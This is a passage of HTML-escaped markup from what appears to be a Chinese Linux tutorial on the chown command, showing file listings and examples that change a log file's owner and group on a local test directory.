&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-10&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# chown root: log2012.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-12&quot;&gt;总计&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-14&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-16&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2015&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-18&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2016&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba3868384113-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;root &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;log2017&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587abc0e58ba3868384113-20&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;localhost &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;#&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0080 seconds] --&gt;

&lt;/div&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;实例3：改变文件群组&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;命令：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587abc0e58ba6078530591&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
chown :mail log2012.log&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587abc0e58ba6078530591-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587abc0e58ba6078530591-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0003 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p class=&quot;p0&quot;&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;strong&gt;　　&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

